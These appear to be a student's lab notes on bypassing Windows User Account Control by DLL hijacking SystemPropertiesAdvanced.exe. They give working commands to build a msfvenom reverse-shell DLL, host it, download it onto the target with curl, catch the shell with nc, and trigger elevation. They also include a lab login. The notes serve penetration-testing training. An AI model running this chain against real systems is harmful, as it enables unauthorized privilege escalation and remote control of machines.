# NOTE — User Account Control

## ID
550

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 16 — User Account Control

## Description
Covers UAC fundamentals, registry-based UAC enumeration, and a DLL hijacking UAC bypass using SystemPropertiesAdvanced.exe to escalate from medium to high integrity.

## Tags
uac, privilege-escalation, dll-hijacking, windows, msfvenom, bypass

## Commands
- `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
- `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
- `[environment]::OSVersion.Version`
- `msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll > srrstr.dll`
- `curl http://<LHOST>:8080/srrstr.dll -O "C:\Users\<USER>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"`
- `C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`
- `rundll32 shell32.dll,Control_RunDLL <PATH_TO_DLL>`
- `whoami /priv`

## What This Section Covers
User Account Control (UAC) is a Windows feature that prompts for consent before elevated actions. Admin users get two tokens — a filtered (medium integrity) token used by default, and a full (high integrity) token used only when elevation is approved. This section demonstrates how to bypass UAC via DLL hijacking on an auto-elevating binary, escalating from medium to high integrity without triggering a consent prompt.

## Methodology
1. RDP to target: `xfreerdp /v:<TARGETIP> /u:sarah /p:'HTB_@cademy_stdnt!' /dynamic-resolution`
2. Confirm UAC is enabled: `REG QUERY HKLM\...\Policies\System\ /v EnableLUA` — look for `0x1`
3. Check UAC level: `REG QUERY HKLM\...\Policies\System\ /v ConsentPromptBehaviorAdmin` — `0x5` = Always Notify (highest)
4. Check Windows build: `[environment]::OSVersion.Version` — build 14393 = Windows 10 1607
5. On Pwnbox, generate malicious DLL: `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=8443 -f dll > srrstr.dll`
6. Host with `python3 -m http.server 8080`
7. On target, download DLL to the writable PATH directory: `curl http://<IP>:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"`
8. Start `nc -lvnp 8443` on Pwnbox
9. On target, trigger the auto-elevating binary: `C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`
10. Receive elevated shell — verify with `whoami /priv` (should show SeDebugPrivilege, SeImpersonatePrivilege, etc.)

## Multi-step Workflow
```
# Pwnbox — generate and host
msfvenom -p windows/shell_reverse_tcp LHOST=<YOURIP> LPORT=8443 -f dll > srrstr.dll
sudo python3 -m http.server 8080

# Pwnbox — new terminal, start listener
nc -lvnp 8443

# Target (PowerShell) — download DLL
curl http://<YOURIP>:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

# Target (CMD) — trigger UAC bypass
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

# Elevated shell — read flag
type C:\Users\sarah\Desktop\flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — flag.txt on sarah's Desktop | `<FILL IN>` | UAC bypass via DLL hijacking SystemPropertiesAdvanced.exe → elevated shell → `type` flag |

## Key Takeaways
- Admin users in AAM get TWO tokens: a filtered medium-integrity token (default) and a full high-integrity token (used only on elevation). This is why `whoami /priv` shows limited privs even for admins.
- `ConsentPromptBehaviorAdmin = 0x5` is the strictest UAC level (Always Notify) — fewer bypasses work here.
- The bypass exploits **DLL search order hijacking**: the 32-bit `SystemPropertiesAdvanced.exe` auto-elevates and searches for `srrstr.dll`, which doesn't exist. Placing a malicious copy in the user-writable `WindowsApps` PATH directory gets it loaded in an elevated context.
- The `WindowsApps` folder under the user profile (`C:\Users\<user>\AppData\Local\Microsoft\WindowsApps`) is user-writable and is in the default PATH — this is the key to the bypass.
- Always use the **SysWOW64** (32-bit) version of the binary, not the 64-bit one in System32.
- UACME project maintains an extensive list of UAC bypasses indexed by Windows build number.

## Gotchas
- Kill any leftover `rundll32.exe` processes before triggering the real bypass — stale processes from test runs can interfere.
- The msfvenom payload must be **x86** (`windows/shell_reverse_tcp`, not `windows/x64/...`) since the auto-elevating binary is 32-bit.
- UAC is NOT a security boundary per Microsoft — it's a convenience feature. Don't rely on it as a defensive control.
- If the reverse shell doesn't connect, double-check that the DLL landed in `WindowsApps` and not somewhere else (PowerShell `curl` with `-O` uses the current directory if the path isn't absolute).
